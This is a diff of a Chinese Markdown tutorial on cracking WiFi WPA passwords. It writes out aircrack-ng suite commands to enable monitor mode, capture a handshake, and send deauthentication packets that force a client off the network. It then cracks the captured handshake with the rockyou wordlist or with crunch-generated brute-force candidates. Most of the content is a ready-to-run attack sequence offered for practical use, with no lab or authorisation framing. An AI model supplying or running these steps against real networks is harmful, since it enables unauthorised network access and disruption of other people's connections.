@@ -1,4 +1,8 @@
+[toc]
+
 [Aircrack-ng 官网资料](http://www.aircrack-ng.org/doku.php?id=airmon-ng)
+
+
 
 ```bash
 # airmon-ng 开启监听模式
@@ -19,6 +23,9 @@ $ airodump-ng -c $ch --bssid $bssid -w ./25 wlan0mon
 # 强制重连
 # aireplay-ng -0 {发送反认证包的个数} -a {BSSID} -c {强制下线的MAC地址(STATION下面的地址)} {无线网卡名称}
 aireplay-ng -0 10 -a $bssid -c $client wlan0mon
+
+# 退出
+airmon-ng stop wlan0mon
 ```
 
 ## 准备
@@ -171,20 +178,11 @@ aireplay-ng -0 0 -a D4:35:38:BD:4C:99 wlan0mon
 
 进到（1）中`{要保存握手包的目录}`下查看握手包，其中"-01.cap"是我们一会儿破解要用到的数据包
 
-## 开始破解密码 aircrack-ng
+## 开始破解密码 
 
-### 解压字典
+### aircrack-ng
 
-如果是 kali 的话，可以使用本地字典：
-
-```bash
-gzip -d /usr/share/wordlists/rockyou.txt.gz
-```
-
-其他的 linux，可以下别的字典：
-[github:conwnet/wpa-dictionary](https://github.com/conwnet/wpa-dictionary)
-
-### 本地
+#### 本地字典
 
 命令格式：
 `aircrack-ng -w {本地的字典文件} {握手包}`
@@ -197,7 +195,20 @@ aircrack-ng -w /usr/share/wordlists/rockyou.txt /home/volume/pro/-01.cap
 
 ![6.png](https://cdn.jsdelivr.net/gh/sword4869/pic1@main/images/202407130814080.png)
 
-### crunch 在线
+如果是 kali 的话，可以使用本地字典：
+
+```bash
+gzip -d /usr/share/wordlists/rockyou.txt.gz
+```
+
+其他的 linux，可以下别的字典：
+[github:conwnet/wpa-dictionary](https://github.com/conwnet/wpa-dictionary)
+
+#### crunch 在线生成
+
+只用cpu，慢！
+
+`crunch <min-len> <max-len> [<charset string>] [options]`
 
 - 知道 ESSID（即 WiFi 的名字，如`360Wifi-A00000`）
   8 位密码：随机数字（`-e`表示 Wifi 的 ESSID，`-w -`表示使用 crunch 即时生成的密码本）
@@ -213,18 +224,9 @@ crunch 8 8 0123456789 | aircrack-ng yourCapName.cap -e yourWifiESSID -w -
 crunch 8 8 0123456789 | aircrack-ng yourCapName.cap -b yourWifiBSSID -w -
 ```
 
-## 退出
+### hashcat
 
-使用命令：
-
-
-```
-airmon-ng stop wlan0mon
-```
-
-
-
----
+ [hashcat.md](hashcat.md) 
 
 ## 参考
 
@@ -232,3 +234,11 @@ airmon-ng stop wlan0mon
 [kali 破解 wifi 密码-fzga](https://www.cnblogs.com/zgang/p/11562012.html)
 
 [WLAN traffic capture [2\] - Linux - NetGab - The daily networking madness](http://netgab.net/web/2016/12/23/wlan-traffic-capture-2-linux/)
+
+
+
+windows版：全部失败，废案
+
+​	[aircrack-ng for windows的简单使用教程_aircrackng使用教程windows-CSDN博客](https://blog.csdn.net/Linux_get/article/details/127023344)
+
+​	[Aircrack-ng - Downloads (aircrackng.org)](http://www.aircrackng.org/downloads.html)：垃圾找不到 commview.dll，网站都被卖了！
